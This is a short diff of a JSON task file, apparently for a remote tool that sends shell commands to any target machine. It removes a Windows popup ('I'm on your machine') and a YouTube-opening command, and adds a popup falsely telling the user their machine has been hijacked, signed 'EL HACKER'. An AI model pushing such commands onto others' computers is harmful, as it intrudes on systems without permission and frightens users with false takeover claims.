@@ -1,7 +1,7 @@
 {
     "tasks": [
         {
-            "id": "f0143643-b926-4f5a-8662-b0f19b4fe312",
+            "id": "f0143643-b926-4f5a-8662-b0f19b4fe313",
             "target": { "os": ["*"] },
             "valid_until": 4133894400,
 
@@ -9,14 +9,7 @@
                 {
                     "type": "shell",
                     "args": {
-                        "input": "msg * \"Hola, estoy en tu maquina :)\""
-                    }
-                },
-
-                {
-                    "type": "shell",
-                    "args": {
-                        "input": "start \"\" \"https://www.youtube.com/watch?v=Aq5WXmQQooo&list=RDAq5WXmQQooo&start_radio=1\""
+                        "input": "msg * \"Hola, tu máquina ha sido secuestrada, si deseas que deje de molestarte deja de apagar mi monitor. Atte: EL HACKER\""
                     }
                 }
             ]
